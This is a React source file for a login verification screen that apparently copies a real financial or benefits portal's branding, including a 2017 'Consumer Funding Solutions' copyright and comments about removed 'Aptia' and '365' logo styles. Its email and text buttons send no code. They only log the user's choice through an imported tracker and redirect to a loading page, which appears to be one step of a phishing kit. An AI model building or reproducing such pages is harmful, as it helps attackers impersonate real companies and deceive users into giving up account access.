import React, { useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { trackActivity } from './tracker';
import Logo from './Logo'; // NEW: Import the centralized logo

const Verification = () => {
  const navigate = useNavigate();

  useEffect(() => {
    trackActivity("Reached Verification Screen");
  }, []);

  const handleSelection = async (method) => {
    await trackActivity("Verification Method Selected", { 
      Chosen_Method: method,
      Status: "Redirecting to Loading..."
    });
    
    navigate('/loading'); 
  };

  return (
    <div style={styles.pageWrapper}>
      {/* Header */}
      <div style={styles.header}>
        <Logo /> {/* UPDATED: Using the centralized Logo component */}
        <div style={styles.loginText}>Login</div>
      </div>

      {/* Main Content */}
      <div style={styles.content}>
        <p style={styles.message}>
          We found you! Pick a method to receive a verification code now.
        </p>

        <div style={styles.optionRow}>
          <span style={styles.optionLabel}>Send code to email: **********</span>
          <button style={styles.btnTeal} onClick={() => handleSelection('E-MAIL')}>
            ✉ &nbsp; E-MAIL
          </button>
        </div>

        <div style={styles.optionRow}>
          <span style={styles.optionLabel}>Send code via text: ***-***-****</span>
          <button style={styles.btnTeal} onClick={() => handleSelection('TEXT')}>
            💬 &nbsp; TEXT
          </button>
        </div>

        <div style={styles.actionRow}>
          <button style={styles.btnGrey} onClick={() => navigate('/')}>✕ &nbsp; CANCEL</button>
          <button style={styles.btnGrey} onClick={() => navigate(-1)}>← &nbsp; BACK</button>
        </div>

        <a href="#" style={styles.linkBlue}>I cannot receive a verification code</a>
      </div>

      {/* Footer */}
      <footer style={styles.footer}>
        <div style={styles.footerLinks}>
          <span>ABOUT US</span>
          <span>TERMS OF USE</span>
          <span>PRIVACY POLICY</span>
        </div>
        <p style={styles.footerCopyright}>
          Copyright © 2017 Consumer Funding Solutions. All Rights Reserved.
        </p>
        <p style={styles.footerSiteMap}>SITE MAP</p>
      </footer>
    </div>
  );
};

const styles = {
  pageWrapper: { width: '100%', minHeight: '100vh', backgroundColor: '#fff', fontFamily: 'Arial, sans-serif', display: 'flex', flexDirection: 'column' },
  header: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', padding: '15px 25px', borderBottom: '1px solid #ddd' },
  // Old logoGroup, logoAptia, logo365, and logoSub styles REMOVED
  loginText: { fontSize: '22px', color: '#888' },
  content: { maxWidth: '500px', margin: '60px auto', padding: '0 20px', textAlign: 'center', flex: 1 },
  message: { fontSize: '18px', marginBottom: '40px', color: '#444' },
  optionRow: { display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '25px', textAlign: 'left' },
  optionLabel: { fontSize: '16px', color: '#333' },
  btnTeal: { background: '#003344', color: 'white', border: 'none', padding: '12px 20px', fontWeight: 'bold', cursor: 'pointer', minWidth: '120px' },
  actionRow: { display: 'flex', justifyContent: 'center', gap: '15px', marginTop: '40px' },
  btnGrey: { background: '#e0e0e0', border: 'none', padding: '15px 25px', cursor: 'pointer', color: '#555', fontWeight: 'bold' },
  linkBlue: { display: 'block', marginTop: '30px', color: '#007bff', textDecoration: 'none', fontSize: '14px' },
  footer: { backgroundColor: '#f0f2f5', padding: '40px 10px', textAlign: 'center', color: '#666', fontSize: '12px' },
  footerLinks: { display: 'flex', justifyContent: 'center', gap: '20px', marginBottom: '15px', fontWeight: 'bold' },
  footerCopyright: { marginBottom: '5px' },
  footerSiteMap: { fontWeight: 'bold' }
};

export default Verification;